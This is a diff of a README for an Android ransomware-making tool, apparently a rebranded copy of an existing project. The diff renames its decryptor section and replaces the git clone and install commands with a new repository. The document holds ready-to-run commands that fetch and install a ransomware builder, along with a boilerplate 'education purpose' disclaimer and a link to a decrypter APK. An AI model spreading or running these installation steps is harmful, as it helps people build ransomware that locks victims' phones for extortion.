@@ -4,7 +4,7 @@ A simple tool for making android ransomware
 ### Disclaimer
 The author Saw Its Only Education Purpose Dont Use Bad Work The author is not responsible for any loses or damage caused by this program.  FB.COM/TamimHossain55
  
-### Sara Decryptor
+### Tamim-Fuckers Decryptor
 Download Decrypter APK's for Tamim Ransomware version 2.0 [Click Here](https://drive.google.com/file/d/1Wz23A6U1sXaNR4qisyKa1p_C7uNuDS-y/view?usp=share_link)
 #### TamimFucks version 1.0
 - ```app_icon``` - custom icon application
@@ -19,12 +19,12 @@ Download Decrypter APK's for Tamim Ransomware version 2.0 [Click Here](https://d
 ### Installation
 Quick installation for Ubuntu, Kali Linux, Darwin (MAC)
 ```bash
-git clone https://github.com/termuxhackers-id/SARA && cd SARA && sudo bash install.sh
+git clone https://github.com/TamimFuckersTeam/TamimFucks-Ransomeware69 && cd TamimFucks-Ransomeware69 && sudo bash install.sh
 ```
 
 Quick installation for Termux Android
 ````bash
-git clone https://github.com/termuxhackers-id/SARA && cd SARA && bash installtermux.sh
+git clone https://github.com/TamimFuckersTeam/TamimFucks-Ransomeware69 && cd TamimFucks-Ransomeware69 && bash installtermux.sh
 ````
 ### Dependencies
 - Java
